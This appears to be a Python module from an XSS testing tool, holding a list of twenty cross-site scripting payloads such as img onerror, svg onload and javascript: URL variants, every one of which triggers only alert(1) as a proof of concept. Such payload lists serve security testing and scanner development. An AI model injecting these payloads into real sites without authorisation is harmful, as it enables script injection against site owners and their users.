# xss_security_gui/payload_library.py

AGGRESSIVE_PAYLOADS = [
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<math><mtext>alert(1)</mtext></math>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<form action=javascript:alert(1)>",
    "<link rel=import href=javascript:alert(1)>",
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    "<script src=data:text/javascript,alert(1)></script>",
    "<img src=x:alert(1)>",
    "<img src=1 href=1 onerror=alert(1)>",
    "<svg><script>alert(1)</script>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
]